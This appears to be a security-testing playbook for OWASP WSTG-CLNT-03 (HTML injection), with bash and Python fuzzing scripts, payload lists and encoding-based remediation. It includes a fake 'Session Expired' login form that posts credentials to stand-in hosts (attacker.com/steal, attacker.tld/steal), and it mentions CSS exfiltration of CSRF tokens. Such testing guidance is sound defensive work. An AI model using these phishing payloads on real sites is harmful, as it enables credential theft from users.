---
name: wstg-clnt-03
description: "Testing for HTML Injection"
category: client-side
owasp_id: WSTG-CLNT-03
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: []
cwe_ids: [CWE-94]
chains_with: [wstg-clnt-05, wstg-clnt-01]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-clnt-01: "Injected HTML lands in an innerHTML-style DOM XSS sink = a defacement/phishing bug escalates into full script execution and cookie/session theft (Medium -> High)"
  wstg-clnt-05: "HTML Injection + CSS Injection = attacker controls both markup and styling, enabling a pixel-perfect credential-phishing overlay plus attribute-selector CSS exfiltration of CSRF tokens/input values (Medium -> High)"
---

# wstg-clnt-03

## Test ID

WSTG-CLNT-03

## Test Name

Testing for HTML Injection

## High-Level Description

HTML injection allows attackers to inject arbitrary HTML content into web pages. While not as severe as XSS (no script execution), it can be used for phishing, defacement, or to manipulate page content to trick users.

---

## What to Check

- [ ] Form fields reflected in page
- [ ] URL parameters in HTML
- [ ] Error messages with user input
- [ ] Search results display
- [ ] User profile content

---

## How to Test

### Step 1: Basic HTML Injection

```bash
#!/bin/bash
TARGET="https://target.com"

payloads=(
    "<h1>Injected</h1>"
    "<a href='https://evil.com'>Click here</a>"
    "<form action='https://evil.com'><input name='password'><input type='submit'></form>"
    "<img src='https://evil.com/logo.png'>"
    "<marquee>HTML Injection</marquee>"
)

for payload in "${payloads[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    response=$(curl -s "$TARGET/search?q=$encoded")

    if echo "$response" | grep -q "<h1>Injected\|<a href='\|<form action="; then
        echo "[VULN] HTML injection: $payload"
    fi
done
```

### Step 2: Phishing Form Injection

```html
<!-- Test injecting a fake login form -->
<form action="https://attacker.com/steal" method="POST">
  <h2>Session Expired - Please Re-login</h2>
  <input name="username" placeholder="Username" />
  <input name="password" type="password" placeholder="Password" />
  <button type="submit">Login</button>
</form>
```

### Step 3: HTML Injection Tester

```python
#!/usr/bin/env python3
import requests
import html

class HTMLInjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

    def test_injection(self, endpoint, param):
        """Test for HTML injection"""
        print(f"[*] Testing HTML injection: {endpoint}?{param}")

        payloads = [
            ("<h1>TEST</h1>", "<h1>TEST</h1>"),
            ("<b>bold</b>", "<b>bold</b>"),
            ("<a href=x>link</a>", "<a href"),
            ("<img src=x>", "<img src"),
            ("<table><tr><td>cell</td></tr></table>", "<table>"),
        ]

        for payload, check in payloads:
            url = f"{self.base_url}{endpoint}"
            response = requests.get(url, params={param: payload})

            # Check if HTML is rendered (not encoded)
            if check in response.text and html.escape(check) not in response.text:
                print(f"[VULN] HTML injection with: {payload[:30]}")
                self.findings.append({
                    "endpoint": endpoint,
                    "parameter": param,
                    "payload": payload,
                    "severity": "Medium"
                })
                break

# Usage
tester = HTMLInjectionTester("https://target.com")
tester.test_injection("/search", "q")
tester.test_injection("/profile", "bio")
```

---

## Tools

| Tool               | Purpose                                          |
| ------------------- | ------------------------------------------------- |
| **Burp Suite**       | Intercept and fuzz parameters for reflected HTML   |
| **OWASP ZAP**        | Automated HTML injection scanning                  |
| **Browser DevTools** | Verify unencoded HTML rendering in the DOM          |

---

## Example Commands/Payloads

### Basic HTML injection payloads

```html
<h1>Injected</h1>
<b>bold text</b>
<a href='https://attacker.tld'>Click here</a>
<img src='https://attacker.tld/logo.png'>
<marquee>HTML Injection PoC</marquee>
```

### Phishing form injection

```html
<form action="https://attacker.tld/steal" method="POST">
  <h2>Session Expired - Please Re-login</h2>
  <input name="username" placeholder="Username" />
  <input name="password" type="password" placeholder="Password" />
  <button type="submit">Login</button>
</form>
```

### curl fuzzing

```bash
TARGET="https://{target}"
for payload in "<h1>Injected</h1>" "<a href='https://attacker.tld'>x</a>" "<table><tr><td>c</td></tr></table>"; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$payload")
  curl -s "$TARGET/search?q=$enc" | grep -qF "$payload" && echo "[VULN] $payload"
done
```

---

## Remediation

```python
# Always HTML encode user output
import html

user_input = "<h1>Malicious</h1>"
safe_output = html.escape(user_input)
# Result: &lt;h1&gt;Malicious&lt;/h1&gt;
```

```javascript
// JavaScript - use textContent instead of innerHTML
element.textContent = userInput // Safe
// NOT: element.innerHTML = userInput;  // Unsafe
```

---

## Risk Assessment

| Finding                     | CVSS | Severity |
| --------------------------- | ---- | -------- |
| HTML injection (phishing)   | 4.3  | Medium   |
| HTML injection (defacement) | 3.5  | Low      |

---

## CWE Categories

| CWE ID     | Title                                               |
| ---------- | --------------------------------------------------- |
| **CWE-80** | Improper Neutralization of Script-Related HTML Tags |


---

## References

- [OWASP WSTG - Testing for HTML Injection (WSTG-CLNT-03)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

## Checklist

```
[ ] Input fields tested
[ ] URL parameters tested
[ ] Error messages checked
[ ] HTML encoding verified
[ ] Findings documented
```
